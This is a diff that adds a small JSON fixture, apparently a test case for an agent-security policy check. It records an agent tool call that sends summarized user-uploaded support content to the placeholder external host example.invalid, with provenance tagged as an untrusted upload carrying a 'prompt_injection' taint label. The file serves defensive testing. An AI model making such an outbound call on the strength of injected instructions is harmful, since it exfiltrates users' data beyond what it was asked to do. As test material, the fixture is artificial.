@@ -1,0 +1,17 @@
+{
+  "agent_id": "support-agent-01",
+  "role": "release_manager",
+  "tool_name": "network",
+  "action": "send_external",
+  "arguments": {
+    "destination": "https://example.invalid",
+    "body": "Summarized user-uploaded troubleshooting content."
+  },
+  "user_intent": "Send retrieved support context to an external endpoint.",
+  "provenance": {
+    "source": "uploaded_ticket_attachment",
+    "trust_level": "user_upload",
+    "retrieved_from": "ticket-asset-123",
+    "taint_labels": ["prompt_injection"]
+  }
+}
